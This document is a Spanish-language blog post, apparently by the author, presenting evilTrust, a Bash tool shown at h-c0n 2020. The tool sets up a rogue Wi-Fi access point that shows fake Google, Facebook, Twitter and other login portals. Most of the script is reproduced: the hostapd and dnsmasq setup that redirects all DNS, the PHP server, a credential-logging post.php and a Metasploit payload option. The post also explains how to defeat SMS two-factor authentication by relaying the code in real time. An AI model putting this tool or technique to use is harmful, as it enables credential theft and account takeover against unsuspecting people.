---
layout: single
title: h-c0n 2020 - evilTrust (Herramienta Ofensiva)
excerpt: "Recientemente estuve en la h-c0n presentando la herramienta evilTrust. En este artículo, comento la utilidad de la herramienta para todos aquellos que la quieran probar. Gracias a los organizadores del evento por invitarme y a todos los presentes por la gran acogida."
date: 2020-02-02
classes: wide
header:
  teaser: /assets/images/evil-trust/evil.png
  teaser_home_page: true
categories:
  - Scripting
tags:
  - GitHub
  - Bash
  - Herramientas
---

<p align="center">
<img src="/assets/images/evil-trust/evil.png" width="200">
</p>

Recientemente estuve en la **h-c0n** presentando la herramienta [evilTrust](https://github.com/s4vitar/evilTrust). Antes que nada quiero agradecer a los organizadores del evento por invitarme y a todos los presentes por la gran acogida, lo pasamos entre todos bastante bien.

<div class="row">
  <div class="columns">
    <img src="/assets/images/evil-trust/Photo5.png" alt="Snow" style="width:30%">
    <img src="/assets/images/evil-trust/Photo4.png" alt="Forest" style="width:37%">
    <img src="/assets/images/evil-trust/Photo2.png" alt="Mountains" style="width:30%">
    <img src="/assets/images/evil-trust/Photo3.png" alt="Mountains" style="width:30%">
    <img src="/assets/images/evil-trust/Photo1.png" alt="Mountains" style="width:34%">
    <img src="/assets/images/evil-trust/Photo6.png" alt="Mountains" style="width:34%">
  </div>
</div>
<br>
Para los interesados, deciros que tenéis la charla disponible en el siguiente enlace:

- [h-c0n 2020 \| evilTrust - Herramienta Ofensiva](https://www.youtube.com/watch?v=-GIA9et7ZRg)

También os la dejo por aquí para aquellos que la quieran ver directamente:

<iframe width="560" height="315" src="https://www.youtube.com/embed/-GIA9et7ZRg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## ¿Qué es EvilTrust?

**EvilTrust** es una herramienta ofensiva, ideal para robar los datos de acceso de un usuario. A altos rasgos, la herramienta se encarga de manera automatizada de desplegar un **Rogue AP**, quedando a la espera de clientes potenciales que se asocien a este para proseguir con el ataque.

Cabe decir que el objetivo principal no es el de un ataque **Evil Twin**, puesto que la finalidad no es obtener la contraseña de una red inalámbrica, sino los datos privados del cliente que se asocie al punto de acceso. 

La herramienta dispone de varias plantillas a utilizar, incluyendo una plantilla personalizada, donde el atacante es capaz de desplegar su propia plantilla.

## ¿Qué capacidades trae evilTrust?

Cada una de las plantillas configuradas (Facebook, Twitter, Google, Starbucks, Yahoo, ...) vienen acompañadas de una plantilla de 2FA (Segundo Factor de Autenticación), la cual nos permitirá obtener el código de acceso que se envía por SMS a todo usuario que disponga de esta medida de protección activada.


## ¿Cómo está estructurada la herramienta?

La herramienta está desarrollada en **Bash**, y es capaz de operar en 2 modos en base al parámetro `-m`:

```go
┌─[root@parrot]─[/opt/evilTrust]
└──╼ #./evilTrust.sh 

╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮
╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮
╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯
┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   (Hecho por s4vitar)
┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮
╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯

Uso:
        [-m] Modo de ejecución (terminal|gui) [-m terminal | -m gui]
        [-h] Mostrar este panel de ayuda
```

- **Modo terminal**: Para los amantes de consola que prefieren no hacer uso de interfaz gráfica
- **Modo GUI**: Para los amantes de interfaz gráfica que odian manejarse por consola

Esta parte se gestiona básicamente desde esta porción de código:

```go
# Main Program

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_enable=0; while getopts ":m:h:" arg; do
		case $arg in
			m) mode=$OPTARG && let parameter_enable+=1;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_enable -ne 1 ]; then
		helpPanel
	else
		if [ "$mode" == "terminal" ]; then
			tput civis; banner
			dependencies
			startAttack
		elif [ "$mode" == "gui" ]; then
			guiMode
		else
			echo -e "Modo no conocido"
			exit 1
		fi
	fi
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi
```

Tras su ejecución, a través de la función `dependencies`, se hace una comprobación de las herramientas necesarias para que evilTrust funcione:

```go
function dependencies(){
	sleep 1.5; counter=0
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n"
	sleep 1

	dependencias=(php dnsmasq hostapd)

	for programa in "${dependencias[@]}"; do
		if [ "$(command -v $programa)" ]; then
			echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada"
			let counter+=1
		else
			echo -e "${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada"
		fi; sleep 0.4
	done

	if [ "$(echo $counter)" == "3" ]; then
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
		sleep 3
	else
		echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}\n"
		tput cnorm; exit
	fi
}
```

Tal y como se puede apreciar, para el correcto funcionamiento de la herramienta, es necesario contar con `php`, `dnsmasq` y `hostpad` instalado. En caso de no contar con estas utilidades, evilTrust se encargará de instalar todo lo necesario para poder operar.

Una vez la comprobación es realizada, se llama a la función `startAttack`, donde tal y como su nombre indica... se comienza a desplegar el ataque.

Es en esta fase donde se configurarán una serie de archivos temporales necesarios para desplegar el AP, haciendo que la tarjeta de red opere en modo Router (es obligatorio que la tarjeta de red en uso acepte el **modo monitor**):

```go
function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface

		for interface in $(cat iface); do
			if [ "$choosed_interface" == "$interface" ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
	done

	rm iface 2>/dev/null
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
	sleep 2
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 5

	echo -e "interface=$choosed_interface\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
	sleep 2
	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 6

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
    sleep 5
    ...    
```

**Consideración**: A nivel de código, la tarjeta de red que ha sido configurada por defecto tiene nombre `wlan0`. Es importante tener en cuenta que esto no siempre es así, las tarjetas de red pueden referenciarse por nombres distintos y no siempre se llaman igual. En caso de ser distinto, es necesario cambiar su nombre desde el propio código.

En esta fase se nos solicitan varias cosas:

* Nombre del punto de acceso.
* Canal en el que queremos que el punto de acceso opere.
* Interfaz de red a utilizar (por defecto **wlan0**)

Una vez rellenados estos puntos, se desplegará un AP con las configuraciones especificadas, asignado la dirección IP '**192.168.1.1**' a nuestra interfaz de red en modo monitor. 

Ya con estas especificaciones seteadas, se procede a la selección de plantilla:

```go
	# Array de plantillas
	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)

	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template

	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
		if [ "$plantilla" == "$template" ]; then
			check_plantillas=1
		fi
	done

	if [ "$template" == "cliqq-payload" ]; then
		check_plantillas=2
	fi

	if [ $check_plantillas -eq 1 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	elif [ $check_plantillas -eq 2 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		cat msfconsole.rc
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		echo -e "\n${redColour}[!] Presiona <Enter> para continuar${endColour}" && read
		popd > /dev/null 2>&1; getCredentials
	else
		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
		pushd $template > /dev/null 2>&1
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	fi
}
```

Es de esperar que en esta fase, se nos solicite con qué plantilla queremos trabajar. 

En caso de seleccionar alguna, por ejemplo imaginemos... '**google-login**', lo que sucederá es que desde que el cliente se conecte al AP, automáticamente se le abrirá el navegador, siendo redirigido a un portal de autenticación, en este caso, de la plataforma de Google, donde verá que para continuar navegando es necesario loguearse con su cuenta de la plantilla seleccionada.

La víctima en ningún momento verá direcciones IP ni nada por el estilo, por lo que le hará pensar en todo momento que se encuentra en la página oficial.

Cada plantilla está organizada en su propio directorio, donde tras seleccionar aquella con la que queramos trabajar, se efectúa un `pushd` hacia ese directorio para posteriormente montar un servidor web mediante `php` hosteado por el puerto 80.

Ya en este punto, se llama a la función `getCredentials`, que es la que se encargará de monitorizar un fichero desde el cual podremos saber en todo momento quién ha introducido sus credenciales, pudiéndolas ver posteriormente en texto claro:

```go
function getCredentials(){

	tput civis; while true; do
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		find \-name datos-privados.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		sleep 3; clear
	done
}
```

Dado que es probable que la víctima cuente con el segundo factor de autenticación activado, disponer de sus credenciales a veces no es suficiente... ya que tras loguearnos tendremos que introducir el código que por SMS la plataforma le envía al dispositivo móvil asociado.

No os preocupéis, está todo pensado. Cada plantilla del portal seleccionado cuenta con un fichero `post.php`, donde tras reportar las credenciales a un fichero externo, se aplica un `Redirect` hacia otra plantilla de la misma plataforma, donde se solicita el código recibido:

```php
<?php $file = 'datos-privados.txt'; file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://192.168.1.1/portal_2fa/index.php" />
```

Para el que no haya entendido bien la jugada, la explico por aquí: La víctima introduce sus credenciales de acceso a la plataforma que hayas escogido para seguir navegando, tú como atacante recibes esas credenciales en texto claro desde consola, posteriormente la víctima es redirigida a otro portal en el que se le pide que introduzca el SMS recibido. El truco está en que la víctima no tiene salida a internet desde tu AP, por lo que nunca recibirá un código de esa sesión, ya que no se está logueando en la plantilla oficial. El chiste está en que tú por detrás, como ya posees sus credenciales, de manera inmediata las vas a estar validando en la plataforma real manualmente, entonces en caso de que posteriormente te pida el código del segundo factor de autenticación, como la víctima está ahora en esa plantilla esperando al código, le va a llegar un SMS pero de tú sesión, no de la suya, lo que le hará pensar que ya una vez introduciéndolo accederá a su cuenta.

De esta forma, te proporcionará el código SMS de tu sesión, pudiendo así posteriormente acceder a su cuenta "burlando" esta medida de protección.

La gran pregunta que algunos me hicisteis... ¿pero y si la víctima no tiene el segundo factor de autenticación habilitado?, pues bueno, en ese caso ya tienes sus credenciales. Es posible que la víctima sospeche y le resulte extraño que se le esté solicitando el código del SMS cuando ni si quiera tiene esa opción configurada, pero es la única forma que se me ocurrió de por lo menos cubrir ambas situaciones. También os digo... un público objetivo de calle no tiene muchas nociones de seguridad y la mayoría de las veces no lo entienden, dejándolo pasar sin sospechar de nada.

En resumen, si la víctima tiene 2FA, podrás obtener el código, y si no lo tiene configurado... en el peor de los casos ya tienes sus credenciales, la víctima se quedará en la nueva plantilla esperando a que le llegue el código cuando nunca le va a llegar y tú mientras por detrás estarás accediendo a su cuenta.

Como pequeña anotación, durante el evento, algunos compañeros hicieron uso de la herramienta y me comentaron que algunos introdujeron incluso hasta sus credenciales de empresa.

## Demo de la herramienta

Configuramos las características de nuestro AP:

![](/assets/images/evil-trust/step_one.png)

Definimos la plantilla a utilizar:

![](/assets/images/evil-trust/step_two.png)

Quedamos a la espera de que alguna víctima se conecte a nuestro AP para visualizar credenciales introducidas:

<p align="center">
<img src="/assets/images/evil-trust/step_three.png">
</p>

La víctima ve que hay una WiFi gratis disponible a su alcance y se conecta:

<p align="center">
<img src="/assets/images/evil-trust/step_four.jpg">
</p>

Tras la asociación al AP, se abre el navegador de manera automática solicitando las credenciales de acceso a la plataforma para continuar navegando:

<p align="center">
<img src="/assets/images/evil-trust/step_five.jpg">
</p>

La víctima introduce sus credenciales para poder continuar navegando:

<p align="center">
<img src="/assets/images/evil-trust/step_six.jpg">
</p>

El atacante visualiza las credenciales introducidas:

<p align="center">
<img src="/assets/images/evil-trust/step_seven.png">
</p>

La víctima es redirigida al portal del segundo factor de autenticación de la plataforma:

<p align="center">
<img src="/assets/images/evil-trust/step_eight.jpg">
</p>

El atacante valida las credenciales de la víctima desde otro navegador y como esta utiliza segundo factor de autenticación, se envía un SMS a la víctima, introduciendo posteriormente su código en la plantilla:

<p align="center">
<img src="/assets/images/evil-trust/step_nine.jpg">
</p>

El atacante recibe desde consola el código y posteriormente accede a su cuenta:

<p align="center">
<img src="/assets/images/evil-trust/step_ten.png">
</p>







